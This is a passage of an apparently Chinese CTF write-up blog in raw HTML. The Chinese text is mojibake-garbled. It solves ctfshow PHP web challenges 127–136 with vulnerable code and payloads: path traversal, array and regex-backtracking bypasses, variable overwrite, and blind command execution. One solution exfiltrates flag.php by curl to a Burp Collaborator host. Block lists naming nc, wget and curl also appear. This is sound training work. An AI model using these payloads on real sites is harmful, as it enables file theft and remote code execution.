ç»è¿‡ç¼–ç ï¼š"</span><span class="token punctuation">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½†æ˜¯è¿™é‡Œæˆ‘ä»¬çš„ç›®çš„æ˜¯åˆ©ç”¨ç©ºæ ¼ã€ç‚¹ã€å·¦ä¸­æ‹¬å·ã€+æ¥è¢«è‡ªåŠ¨è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼Œç»è¿‡fuzzå¾—åˆ°ç©ºæ ¼ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘ç©ºæ ¼ç»è¿‡URLç¼–ç ç¡®æ˜¯+ï¼Œä½†æ˜¯%20ç¡®å®ç¬¦åˆè¯¥é¢˜ç›®</p><p><code>?ctf%20show=ilove36d</code></p><h2 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$f1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$f2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$f1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$f1</span><span class="token punctuation">,</span><span class="token variable">$f2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"å—¯å“¼ï¼Ÿ"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[0-9]|[a-z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">NULL</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong><a href="https://www.cnblogs.com/lost-1987/articles/3309693.html" target="_blank" rel="noopener">gettext()</a>æ‹“å±•å‡½æ•°çš„ç”¨æ³•</strong>ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">_</span><span class="token punctuation">(</span><span class="token punctuation">)</span>æ˜¯<span class="token function">gettext</span><span class="token punctuation">(</span><span class="token punctuation">)</span>çš„æ‹“å±•å‡½æ•°åœ¨å¼€å¯ç›¸å…³è®¾å®šåï¼Œ<span class="token function">_</span><span class="token punctuation">(</span><span class="token string">"666"</span><span class="token punctuation">)</span>ç­‰ä»·äº<span class="token function">gettext</span><span class="token punctuation">(</span><span class="token string">"666"</span><span class="token punctuation">)</span>ï¼Œä¸”å°±è¿”å›å…¶ä¸­çš„å‚æ•°<span class="token delimiter">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">gettext</span><span class="token punctuation">(</span><span class="token number">666</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//è¾“å‡º 666</span><span class="token keyword">echo</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">_</span><span class="token punctuation">(</span><span class="token string">"666"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//è¾“å‡º 666</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.runoob.com/php/php-get_defined_vars-function.html" target="_blank" rel="noopener">get_defined_vars()å‡½æ•°</a>ï¼šè¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ ï¼Œveryé¡¾åæ€ä¹‰</p><p>å› ä¸º$flagå±äºæ˜¯è¢«å®šä¹‰å˜é‡çš„èŒƒç•´ï¼Œæ‰€ä»¥åˆ©ç”¨<code>?f1=_&amp;f2=get_defined_vars</code></p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$f1</span><span class="token punctuation">,</span><span class="token variable">$f2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span>_<span class="token punctuation">,</span><span class="token string">'get_defined_vars'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span>get_defined_vars<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span>get_defined_vars<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token string">'ctfshow'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.runoob.com/php/func-filesystem-readfile.html" target="_blank" rel="noopener">readfile()å‡½æ•°</a>ï¼š<code>?f=/ctfshow/../../../../../../../var/www/html/flag.php</code>ç›´æ¥è¯»å°±å®Œäº‹äº†</p><h2 id="web130ã€web131"><a href="#web130ã€web131" class="headerlink" title="web130ã€web131"></a>web130ã€web131</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/.+?ctfshow/is'</span><span class="token punctuation">,</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'bye!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token string">'ctfshow'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'bye!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="phpç‰¹æ€§ï¼š"><a href="#phpç‰¹æ€§ï¼š" class="headerlink" title="phpç‰¹æ€§ï¼š"></a>phpç‰¹æ€§ï¼š</h3><p>preg_matchä¸è¯†åˆ«æ•°ç»„ï¼Œå¦åˆ™è¿”å›falseï¼ŒåŒ¹é…ä¸€æ¬¡è¿”å›1ï¼Œæ²¡æœ‰è¿”å›0</p><p>if(0 === flase)è¿”å›å€¼ä¸ºfalse0ä¸æ˜¯å¼ºç­‰äºfalseçš„</p><p>stripos()å‡½æ•°å¯¹æ•°ç»„ä¸è¯†åˆ«ï¼Œé‡åˆ°æ•°ç»„ä¼šè¿”å›false</p><h3 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h3><p>payloadï¼š<code>?f=ctfshow[]</code></p><h3 id="æ–¹æ³•äºŒï¼š-1"><a href="#æ–¹æ³•äºŒï¼š-1" class="headerlink" title="æ–¹æ³•äºŒï¼š"></a>æ–¹æ³•äºŒï¼š</h3><p>é‡‡ç”¨<code>æ•°ç»„</code>ç»•è¿‡çš„æ–¹æ³•ï¼Œ<code>striposå‡½æ•°</code>ä¼šè¿”å›<code>null</code>,<code>null!=false</code>,æ‰€ä»¥å¯ä»¥ç»•è¿‡striposå‡½æ•°</p><p><code>?f[]=666</code></p><h3 id="æ–¹æ³•ä¸‰ï¼š"><a href="#æ–¹æ³•ä¸‰ï¼š" class="headerlink" title="æ–¹æ³•ä¸‰ï¼š"></a>æ–¹æ³•ä¸‰ï¼š</h3><p><strong>pç¥</strong>ï¼š<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">PHPåˆ©ç”¨PCREå›æº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡æŸäº›å®‰å…¨é™åˆ¶</a></p><p>æº¢å‡ºå›æº¯é™åˆ¶</p><p>åˆ©ç”¨è„šæœ¬ï¼š</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://.ctf.show:8080/"</span>data<span class="token operator">=</span><span class="token punctuation">{</span>    <span class="token string">'f'</span><span class="token punctuation">:</span><span class="token string">'very'</span><span class="token operator">*</span><span class="token number">250000</span><span class="token operator">+</span><span class="token string">'ctfshow'</span><span class="token punctuation">}</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h2><p>é¦–å…ˆæ‰“å¼€æ˜¯ä¸€ä¸ªç½‘é¡µï¼Œå¾¡å‰‘æ‰«ä¸€ä¸‹æœ‰robots.txtå’Œadmin/index.php</p><p>æ‰“å¼€admin/index.phpå¾—åˆ°æºç </p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$code</span> <span class="token operator">===</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x36D</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">===</span> <span class="token variable">$flag</span> <span class="token operator">||</span> <span class="token variable">$username</span> <span class="token operator">===</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$code</span> <span class="token operator">==</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é¦–å…ˆæ˜¯è¿›è¡Œäº†å¼ºç±»å‹è½¬æ¢ï¼Œä½œç”¨æœªçŸ¥ï¼Œç»§ç»­å¾€ä¸‹å®¡</p><p><a href="https://www.runoob.com/php/func-math-mt-rand.html" target="_blank" rel="noopener">PHP mt_rand() å‡½æ•°</a>ï¼šä½¿ç”¨ Mersenne Twister ç®—æ³•ç”Ÿæˆéšæœºæ•´æ•°ã€‚ç›¸æ¯”è¾ƒäºrand()å‡½æ•°å…¶é€Ÿåº¦æ›´å¿«</p><p><code>&amp;&amp;</code>ï¼šéœ€è¦å‰é¢å’Œåé¢çš„æ¡ä»¶éƒ½ä¸ºtrueï¼Œæ‰ä¼šè¿”å›true</p><p><code>||</code>ï¼šåªéœ€è¦æ»¡è¶³å…¶ä¸­ä»»æ„ä¸€ä¸ªå°±è¡Œäº†</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token boolean">false</span> <span class="token operator">&amp;&amp;</span> <span class="token boolean">false</span> <span class="token operator">||</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"true!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"false!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//è¿”å›ç»“æœä¸ºtrue</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰€ä»¥åªéœ€è¦æ»¡è¶³åè€…å°±è¡Œï¼š<code>$username ===&quot;admin&quot;</code></p><p>åŒæ—¶æ»¡è¶³ä¸‹ä¸€ä¸ªifï¼š<code>$code == &#39;admin&#39;</code></p><p>å½“ç„¶è¿˜æœ‰ç¬¬ä¸€ä¸ªiféœ€è¦æ»¡è¶³</p><h2 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//flag.php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$F</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/system|nc|wget|exec|passthru|netcat/i'</span><span class="token punctuation">,</span> <span class="token variable">$F</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"6ä¸ªå­—æ¯éƒ½è¿˜ä¸å¤Ÿå‘€?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¥ä¸‹æ¥çš„æ„æ€æœ‰ç‚¹å¥—å¨ƒçš„æ„æ€</p><pre><code>$_GET[&#39;F&#39;]=`$F` ;ls;eval(substr($F,0,6))=eval(`$F` ;)$f=$_GET[&#39;F&#39;]=`$F` ;ls; eval(`$F` ;)= eval(``$F` ;ls;`) å¯ä»¥åˆ©ç”¨sleepå‡½æ•°éªŒè¯</code></pre><p>ä½†æ˜¯æ— å›æ˜¾ï¼Œå±äºæ— å›æ˜¾RCE</p><p>è¿™é‡Œçš„wpæ˜¯åˆ©ç”¨curlæ¥å®ç°flag.phpçš„å¤–å¸¦</p><pre class="line-numbers language-php"><code class="language-php">payload<span class="token punctuation">:</span><span class="token operator">?</span>F<span class="token operator">=</span>`<span class="token variable">$F</span> `<span class="token punctuation">;</span><span class="token operator">+</span>curl <span class="token operator">-</span>X <span class="token constant">POST</span> <span class="token operator">-</span>F xx<span class="token operator">=</span>@flag<span class="token punctuation">.</span>php 6hokugw3tjr8vdj8f2yldiead1jt7i<span class="token punctuation">.</span>burpcollaborator<span class="token punctuation">.</span>net<span class="token shell-comment comment"># -X POST  æŒ‡å®š HTTP è¯·æ±‚çš„æ–¹æ³•ä¸º POST</span><span class="token shell-comment comment"># å…¶ä¸­-F æ˜¯å¸¦æ–‡ä»¶çš„å½¢å¼å‘é€postè¯·æ±‚</span><span class="token shell-comment comment"># xxæ˜¯ä¸Šä¼ æ–‡ä»¶çš„nameå€¼ï¼Œflag.phpå°±æ˜¯ä¸Šä¼ çš„æ–‡ä»¶ </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html" target="_blank" rel="noopener">curl çš„å‚æ•°ç”¨æ³•</a></p><p><a href="https://requestbin.net/" target="_blank" rel="noopener">åœ¨çº¿å·¥å…·</a>(æ²¡ç”¨æ˜ç™½)</p><p><a href="https://blog.csdn.net/qq_46091464/article/details/109095382" target="_blank" rel="noopener">åˆ©ç”¨burpsuite</a></p><p>ä¸é”™ä¸é”™å¾ˆå¥½ï¼Œå­¦åˆ°ä¸€æ‹›é¢å¯¹æ— å›æ˜¾rce</p><h2 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$key1</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$key2</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"nonononono"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>@<span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key1</span> <span class="token operator">==</span> <span class="token string">'36d'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$key2</span> <span class="token operator">==</span> <span class="token string">'36d'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://blog.csdn.net/qq_49480008/article/details/115872899" target="_blank" rel="noopener">$_SERVER[â€˜QUERY_STRINGâ€™]è§£é‡Š</a></p><p><a href="https://www.w3school.com.cn/php/func_array_extract.asp" target="_blank" rel="noopener">PHP extract() å‡½æ•°</a></p><p>payloadï¼š<code>?_POST[key1]=36d&amp;_POST[key2]=36d</code></p><h2 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//flag.php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$F</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i'</span><span class="token punctuation">,</span> <span class="token variable">$F</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"å¸ˆå‚…ä»¬å±…ç„¶ç ´è§£äº†å‰é¢çš„ï¼Œé‚£å°±æ¥ä¸€ä¸ªåŠ å¼ºç‰ˆå§"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤æ¬¡åˆ©ç”¨æ²¡æœ‰äº†curlï¼Œåˆ©ç”¨çš„æ˜¯<a href="https://www.runoob.com/linux/linux-comm-cp.html" target="_blank" rel="noopener">cpå‘½ä»¤</a></p><pre><code>?F=`$F` ;cp flag.php 666.txt?F=`$F` ;nl flag.php&gt;666.txt?F=`$F` ;mv flag.php 666.txt</code></pre><h2 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\{|\}|\>|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span><span class="token punctuation">,</span> <span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'too young too simple sometimes naive!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$c</span><span 